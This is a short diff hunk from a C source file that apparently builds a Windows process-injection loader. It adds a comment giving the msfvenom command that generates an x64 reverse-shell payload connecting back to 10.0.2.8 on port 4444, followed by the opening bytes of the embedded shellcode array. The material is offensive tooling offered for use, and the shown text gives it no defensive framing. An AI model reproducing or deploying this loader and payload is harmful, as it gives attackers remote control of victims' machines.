@@ -8,7 +8,8 @@ typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
 
 #define ProcessBasicInformation 0
 
-// Shellcode (Replace with your own if needed)
+// Shellcode for creating a reverse shell
+// msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=10.0.2.8 -f c -v shellcode
 unsigned char shellcode[] = 
     "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
     "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
